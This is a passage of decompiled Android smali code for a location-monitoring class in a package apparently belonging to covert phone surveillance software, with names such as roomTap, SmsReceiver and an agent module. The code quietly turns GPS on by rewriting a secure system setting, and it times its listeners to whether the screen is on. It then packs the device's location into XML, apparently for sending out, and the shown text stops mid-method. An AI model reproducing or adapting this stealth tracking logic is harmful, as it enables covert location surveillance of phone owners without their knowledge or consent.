.class public final Lcom/network/location/a;
.super Ljava/lang/Object;


# static fields
.field static a:Ljava/util/concurrent/ScheduledExecutorService;

.field static final b:Ljava/lang/Object;

.field private static c:Lcom/network/android/v;

.field private static d:Z

.field private static e:Ljava/util/Timer;

.field private static f:Landroid/os/Handler;

.field private static g:Ljava/lang/Boolean;

.field private static h:Lcom/network/android/v;

.field private static i:Lcom/network/android/v;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x0

    const/4 v1, 0x0

    sput-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    sput-object v1, Lcom/network/location/a;->a:Ljava/util/concurrent/ScheduledExecutorService;

    sput-boolean v0, Lcom/network/location/a;->d:Z

    sput-object v1, Lcom/network/location/a;->e:Ljava/util/Timer;

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/network/location/a;->g:Ljava/lang/Boolean;

    sput-object v1, Lcom/network/location/a;->h:Lcom/network/android/v;

    sput-object v1, Lcom/network/location/a;->i:Lcom/network/android/v;

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "LocationThread"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v1, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {v1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/network/location/a;->f:Landroid/os/Handler;

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/network/location/a;->b:Ljava/lang/Object;

    return-void
.end method

.method private static a(Landroid/content/ContentResolver;Ljava/lang/String;Z)V
    .locals 3

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "LocationMonitorManager setLocationProviderEnabled in provider: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-eqz p2, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "+"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :goto_0
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager setLocationProviderEnabled out provider: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v1, "location_providers_allowed"

    invoke-static {p0, v1, v0}, Landroid/provider/Settings$Secure;->putString(Landroid/content/ContentResolver;Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "-"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_0
.end method

.method public static a(Landroid/content/Context;)V
    .locals 6

    :try_start_0
    invoke-static {p0}, Lcom/network/location/a;->e(Landroid/content/Context;)V

    const-string v0, "LocationMonitorManager resetLocationMonitor start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Lcom/network/android/v;

    const-string v1, ""

    invoke-direct {v0, v1}, Lcom/network/android/v;-><init>(Ljava/lang/String;)V

    sput-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/location/a;->d:Z

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lcom/network/android/v;->a(Z)V

    const-string v0, "location"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    sget-boolean v1, Lcom/network/android/roomTap/k;->d:Z

    if-nez v1, :cond_0

    invoke-static {}, Lcom/network/android/a/c;->e()Z

    move-result v1

    if-eqz v1, :cond_1

    const-string v1, "LocationMonitorManager resetLocationMonitor is 4.3. not allowed black screen"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_0
    sget-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Lcom/network/android/v;->a(Z)V

    :goto_0
    const-string v1, "LocationMonitorManager resetLocationMonitor start NETWORK_PROVIDER and PASSIVE_PROVIDER"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v1, Lcom/network/android/v;

    const-string v2, "mNetworklocListener"

    invoke-direct {v1, v2}, Lcom/network/android/v;-><init>(Ljava/lang/String;)V

    sput-object v1, Lcom/network/location/a;->h:Lcom/network/android/v;

    const-string v1, "network"

    const-wide/16 v2, 0x2328

    const/4 v4, 0x0

    sget-object v5, Lcom/network/location/a;->h:Lcom/network/android/v;

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    new-instance v1, Lcom/network/android/v;

    const-string v2, "mPasiveListener"

    invoke-direct {v1, v2}, Lcom/network/android/v;-><init>(Ljava/lang/String;)V

    sput-object v1, Lcom/network/location/a;->i:Lcom/network/android/v;

    const-string v1, "passive"

    const-wide/16 v2, 0x2328

    const/4 v4, 0x0

    sget-object v5, Lcom/network/location/a;->i:Lcom/network/android/v;

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    const-string v0, "LocationMonitorManager resetLocationMonitor end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_1
    return-void

    :cond_1
    invoke-static {p0, v0}, Lcom/network/location/a;->a(Landroid/content/Context;Landroid/location/LocationManager;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager resetLocationMonitor Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1
.end method

.method private static a(Landroid/content/Context;Landroid/location/Location;)V
    .locals 5

    const/4 v4, 0x0

    const-string v0, "LocationMonitorManager addGPS"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-eqz p1, :cond_0

    const-string v0, "LocationMonitorManager addGPS GPS location"

    invoke-static {v0}, Lcom/network/android/c/a/a;->b(Ljava/lang/String;)V

    const-string v0, "Satalite"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v0

    new-instance v1, Ljava/io/StringWriter;

    invoke-direct {v1}, Ljava/io/StringWriter;-><init>()V

    invoke-static {v0, v1}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    const-string v2, ""

    const-string v3, "locations"

    invoke-interface {v0, v2, v3}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    invoke-static {v0, p1}, Lcom/network/android/m;->a(Lorg/xmlpull/v1/XmlSerializer;Landroid/location/Location;)V

    const-string v2, ""

    const-string v3, "locations"

    invoke-interface {v0, v2, v3}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    invoke-static {v0}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;)V

    invoke-virtual {v1}, Ljava/io/StringWriter;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, v4, v4}, Lcom/network/android/j;->a(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/String;[[B)V

    :goto_0
    return-void

    :cond_0
    const-string v0, "LocationMonitorManager addGPS add cell (location == null)"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/location/a;->h(Landroid/content/Context;)V

    goto :goto_0
.end method

.method private static a(Landroid/content/Context;Landroid/location/LocationManager;)V
    .locals 8

    const/4 v7, 0x1

    :try_start_0
    invoke-static {}, Lcom/network/android/a/c;->e()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "LocationMonitorManager addLocationListiner catual. is 4.3. not allowed black screen"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lcom/network/android/v;->a(Z)V

    :cond_0
    sget-object v6, Lcom/network/location/a;->b:Ljava/lang/Object;

    monitor-enter v6
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    const-string v0, "LocationMonitorManager addLocationListiner start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-boolean v0, Lcom/network/location/a;->d:Z

    if-eqz v0, :cond_2

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    if-eqz v0, :cond_2

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-virtual {v0}, Lcom/network/android/v;->c()Z

    move-result v0

    if-nez v0, :cond_2

    const-string v0, "LocationMonitorManager addLocationListiner add start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "gps"

    invoke-virtual {p1, v0}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager addLocationListinerOff GPS active:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-nez v0, :cond_3

    invoke-static {p0}, Lcom/network/b/a;->a(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "location_providers_allowed"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager addLocationListiner allowedProvider:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "gps"

    const/4 v2, 0x1

    invoke-static {v0, v1, v2}, Lcom/network/location/a;->a(Landroid/content/ContentResolver;Ljava/lang/String;Z)V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "location_providers_allowed"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager addLocationListiner allowedProviderNew: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/network/location/a;->g:Ljava/lang/Boolean;

    const-string v0, "NetworkLocation"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "gp"

    sget-object v2, Lcom/network/location/a;->g:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    invoke-static {p0}, Lcom/network/android/a/c;->b(Landroid/content/Context;)V

    new-instance v0, Lcom/network/android/v;

    invoke-direct {v0}, Lcom/network/android/v;-><init>()V

    sput-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    const-string v1, "gps"

    const-wide/16 v2, 0x2328

    const/4 v4, 0x0

    sget-object v5, Lcom/network/location/a;->c:Lcom/network/android/v;

    move-object v0, p1

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/network/android/v;->a(Z)V

    :cond_1
    :goto_0
    const-string v0, "LocationMonitorManager addLocationListiner add end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_2
    const-string v0, "LocationMonitorManager addLocationListiner endd"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    monitor-exit v6

    :goto_1
    return-void

    :cond_3
    new-instance v0, Lcom/network/android/v;

    invoke-direct {v0}, Lcom/network/android/v;-><init>()V

    sput-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    const-string v1, "gps"

    const-wide/16 v2, 0x2328

    const/4 v4, 0x0

    sget-object v5, Lcom/network/location/a;->c:Lcom/network/android/v;

    move-object v0, p1

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/network/android/v;->a(Z)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    :try_start_2
    monitor-exit v6

    throw v0
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    move-exception v0

    const/16 v1, 0x1b

    invoke-static {v7, v1}, Lcom/network/android/c/a/b;->a(IS)V

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager addGPSonScreen Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1
.end method

.method public static a()Z
    .locals 2

    const/4 v0, 0x0

    :try_start_0
    sget-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    if-eqz v1, :cond_0

    sget-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-virtual {v1}, Lcom/network/android/v;->c()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result v1

    if-eqz v1, :cond_0

    const/4 v0, 0x1

    :cond_0
    :goto_0
    return v0

    :catch_0
    move-exception v1

    const-string v1, "LocationMonitorManager, isMlocListenerActive exception. returning false"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private static a(Landroid/location/Location;J)Z
    .locals 5

    const/4 v0, 0x0

    :try_start_0
    invoke-virtual {p0}, Landroid/location/Location;->getTime()J

    move-result-wide v1

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "LocationMonitorManager isLoactionValid lastTime: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v4, Ljava/util/Date;

    invoke-direct {v4, v1, v2}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v4}, Ljava/util/Date;->toGMTString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->b(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    sub-long v1, v3, v1

    const-wide/16 v3, 0x2

    mul-long/2addr v3, p1

    cmp-long v3, v1, v3

    if-lez v3, :cond_0

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "LocationMonitorManager isLoactionValid Smaller then sampel rate: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ", sample rate:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1, p2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->b(Ljava/lang/String;)V

    const-string v1, "LocationMonitorManager isLoactionValid addGPS add cell (GPS is Smaller then sampel rate)"

    invoke-static {v1}, Lcom/network/android/c/a/a;->b(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x1

    goto :goto_0

    :catch_0
    move-exception v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "LocationMonitorManager isLoactionValid Exception: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static b(Landroid/content/Context;)V
    .locals 4

    :try_start_0
    const-string v0, "LocationMonitorManager removeLocationListinerActive startt"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v1, Lcom/network/location/a;->b:Ljava/lang/Object;

    monitor-enter v1
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    const-string v0, "LocationMonitorManager removeLocationListinerActive after locking"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-boolean v0, Lcom/network/location/a;->d:Z

    if-eqz v0, :cond_0

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    if-eqz v0, :cond_0

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-virtual {v0}, Lcom/network/android/v;->c()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "LocationMonitorManager removeLocationListinerActive Location remove on screen on start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "location"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    sget-object v2, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-virtual {v0, v2}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Lcom/network/android/v;->a(Z)V

    invoke-static {p0}, Lcom/network/location/a;->g(Landroid/content/Context;)V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v2, "location_providers_allowed"

    invoke-static {v0, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "LocationMonitorManager resetAllowedProvider allowedProviderNew: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "LocationMonitorManager Location remove on screen on end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_0
    monitor-exit v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    const-string v0, "LocationMonitorManager removeLocationListinerOnActive endd"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    return-void

    :catchall_0
    move-exception v0

    monitor-exit v1

    throw v0
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    move-exception v0

    const/4 v1, 0x1

    const/16 v2, 0x1b

    invoke-static {v1, v2}, Lcom/network/android/c/a/b;->a(IS)V

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager removeLocationListinerOnActive Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static c(Landroid/content/Context;)V
    .locals 3

    :try_start_0
    invoke-static {p0}, Lcom/network/b/a;->a(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    invoke-static {}, Lcom/network/android/a/c;->e()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "LocationMonitorManager resetAllowedProviderOnRestart"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    const-string v1, "NetworkLocation"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "gp"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/network/location/a;->g:Ljava/lang/Boolean;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "LocationMonitorManager resetAllowedProviderOnRestart addGps: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/network/location/a;->g:Ljava/lang/Boolean;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/location/a;->g:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/network/location/a;->g(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager resetAllowedProviderOnRestart Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static d(Landroid/content/Context;)V
    .locals 1

    invoke-static {}, Lcom/network/android/a/c;->e()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "LocationMonitorManager addLocationListiner is 4.3. not allowed black screen"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    return-void

    :cond_0
    const-string v0, "location"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    invoke-static {p0, v0}, Lcom/network/location/a;->a(Landroid/content/Context;Landroid/location/LocationManager;)V

    goto :goto_0
.end method

.method public static e(Landroid/content/Context;)V
    .locals 3

    :try_start_0
    const-string v0, "LocationMonitorManager stop"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    const-string v1, "location"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

